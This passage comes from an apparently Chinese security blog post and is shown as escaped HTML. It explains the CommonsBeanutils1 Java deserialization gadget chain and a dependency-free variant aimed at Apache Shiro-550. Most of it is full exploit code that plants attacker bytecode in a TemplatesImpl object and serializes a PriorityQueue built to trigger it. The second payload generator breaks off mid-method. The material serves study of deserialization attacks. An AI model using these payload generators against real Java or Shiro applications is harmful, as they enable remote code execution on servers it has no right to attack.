&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>传入两个对象，如果property为空则直接比较对象，否则用getProperty取出属性比较，调用对象的getter&lt;/p>
&lt;p>回想当时TemplatesImpl的调用链&lt;/p>
&lt;pre tabindex="0">&lt;code>TemplateImpl#getOutputProperties public
-&amp;gt; TemplateImpl#newTransformer public
-&amp;gt; TemplateImpl#getTransletInstance
-&amp;gt; TemplateImpl#defineTransletClasses
-&amp;gt; TemplateImpl#defineClass default
&lt;/code>&lt;/pre>&lt;p>注意到&lt;code>getOutputProperties&lt;/code>，是触发后面的关键&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">synchronized&lt;/span> &lt;span style="color:#111">Properties&lt;/span> &lt;span style="color:#75af00">getOutputProperties&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">try&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">newTransformer&lt;/span>&lt;span style="color:#f92672">().&lt;/span>&lt;span style="color:#75af00">getOutputProperties&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>&lt;span style="color:#00a8c8">catch&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">TransformerConfigurationException&lt;/span> &lt;span style="color:#111">e&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>它就是一个getter！跟前面的结合起来&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">PropertyUtils&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getProperty&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">o1&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;outputProperties&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>当o1为TemplatesImpl对象时，就会调用getOutputProperties&lt;/p>
&lt;p>构造链子&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.io.ByteArrayInputStream&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.io.ByteArrayOutputStream&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.io.ObjectInputStream&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.io.ObjectOutputStream&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.lang.reflect.Field&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.util.PriorityQueue&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">javassist.ClassPool&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">org.apache.commons.beanutils.BeanComparator&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">CommonsBeanutils1&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">setFieldValue&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Object&lt;/span> &lt;span style="color:#111">obj&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">fieldName&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">Object&lt;/span> &lt;span style="color:#111">value&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">Exception&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Field&lt;/span> &lt;span style="color:#111">field&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">obj&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getClass&lt;/span>&lt;span style="color:#f92672">().&lt;/span>&lt;span style="color:#75af00">getDeclaredField&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">fieldName&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">field&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">setAccessible&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">true&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">field&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">set&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">obj&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">value&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">Exception&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">TemplatesImpl&lt;/span> &lt;span style="color:#111">obj&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">TemplatesImpl&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">setFieldValue&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">obj&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;_bytecodes&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#00a8c8">byte&lt;/span>&lt;span style="color:#f92672">[][]{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">ClassPool&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getDefault&lt;/span>&lt;span style="color:#f92672">().&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">evil&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">EvilTemplatesImpl&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getName&lt;/span>&lt;span style="color:#f92672">()).&lt;/span>&lt;span style="color:#75af00">toBytecode&lt;/span>&lt;span style="color:#f92672">()&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">});&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">setFieldValue&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">obj&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;_name&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;HelloTemplatesImpl&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">setFieldValue&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">obj&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;_tfactory&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">TransformerFactoryImpl&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">final&lt;/span> &lt;span style="color:#111">BeanComparator&lt;/span> &lt;span style="color:#111">comparator&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">BeanComparator&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">final&lt;/span> &lt;span style="color:#111">PriorityQueue&lt;/span>&lt;span style="color:#f92672">&amp;lt;&lt;/span>&lt;span style="color:#111">Object&lt;/span>&lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#111">queue&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">PriorityQueue&lt;/span>&lt;span style="color:#f92672">&amp;lt;&lt;/span>&lt;span style="color:#111">Object&lt;/span>&lt;span style="color:#f92672">&amp;gt;(&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">comparator&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// stub data for replacement later
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">queue&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">add&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">queue&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">add&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">setFieldValue&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">comparator&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;property&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;outputProperties&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">setFieldValue&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">queue&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;queue&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Object&lt;/span>&lt;span style="color:#f92672">[]{&lt;/span>&lt;span style="color:#111">obj&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">obj&lt;/span>&lt;span style="color:#f92672">});&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">ByteArrayOutputStream&lt;/span> &lt;span style="color:#111">barr&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ByteArrayOutputStream&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">ObjectOutputStream&lt;/span> &lt;span style="color:#111">oos&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ObjectOutputStream&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">barr&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">oos&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">writeObject&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">queue&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">oos&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">close&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">barr&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">ObjectInputStream&lt;/span> &lt;span style="color:#111">ois&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ObjectInputStream&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ByteArrayInputStream&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">barr&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">toByteArray&lt;/span>&lt;span style="color:#f92672">()));&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Object&lt;/span> &lt;span style="color:#111">o&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Object&lt;/span>&lt;span style="color:#f92672">)&lt;/span>&lt;span style="color:#111">ois&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">readObject&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="shiro-550无cc">Shiro-550(无cc&lt;/h3>
&lt;p>shiro本身的依赖是有cb的，但是会因为serialVersionUID不符而报错，即使我们调对生成payload的本地依赖版本和目标环境一致也会出现cc依赖版本不对的情况，我们设想一条无依赖的Shiro反序列化利用链&lt;/p>
&lt;p>在BeanComparator的构造函数处，没有显式传入Comparator时默认使用cc中的ComparableComparator，替代类需要满足这样的条件：&lt;/p>
&lt;ul>
&lt;li>实现java.util.Comparator接口&lt;/li>
&lt;li>实现java.io.Serializable接口&lt;/li>
&lt;li>最好自带，兼容性强&lt;/li>
&lt;/ul>
&lt;p>我们找到了java.util.String中的内部私有类CaseInsesitiveComparator，它实现了Comparator和Serializable&lt;/p>
&lt;p>替换exp&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">org.apache.commons.beanutils.BeanComparator&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.io.ByteArrayOutputStream&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.io.ObjectOutputStream&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.lang.reflect.Field&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.util.PriorityQueue&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">CommonsBeanutils1Shiro&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">setFieldValue&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Object&lt;/span> &lt;span style="color:#111">obj&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">fieldName&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">Object&lt;/span> &lt;span style="color:#111">value&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">Exception&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Field&lt;/span> &lt;span style="color:#111">field&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">obj&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getClass&lt;/span>&lt;span style="color:#f92672">().&lt;/span>&lt;span style="color:#75af00">getDeclaredField&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">fieldName&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">field&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">setAccessible&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">true&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">field&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">set&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">obj&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">value&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">byte&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#75af00">getPayload&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">byte&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">clazzBytes&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">Exception&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">TemplatesImpl&lt;/span> &lt;span style="color:#111">obj&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">TemplatesImpl&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">setFieldValue&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">obj&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;_bytecodes&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#00a8c8">byte&lt;/span>&lt;span style="color:#f92672">[][]{&lt;/span>&lt;span style="color:#111">clazzBytes&lt;/span>&lt;span style="color:#f92672">});&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">setFieldValue&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">obj&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;_name&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;HelloTemplatesImpl&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">setFieldValue&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">obj&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;_tfactory&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">TransformerFactoryImpl&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">final&lt;/span> &lt;span style="color:#111">BeanComparator&lt;/span> &lt;span style="color:#111">comparator&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">BeanComparator&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">CASE_INSENSITIVE_ORDER&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">final&lt;/span> &lt;span style="color:#111">PriorityQueue&lt;/span>&lt;span style="color:#f92672">&amp;lt;&lt;/span>&lt;span style="color:#111">Object&lt;/span>&lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#111">queue&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">PriorityQueue&lt;/span>&lt;span style="color:#f92672">&amp;lt;&lt;/span>&lt;span style="color:#111">Object&lt;/span>&lt;span style="color:#f92672">&amp;gt;(&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">comparator&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// stub data for replacement later
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">queue&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">add&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;1&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">queue&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">add&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;1&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">setFieldValue&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">comparator&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;property&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;outputProperties&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
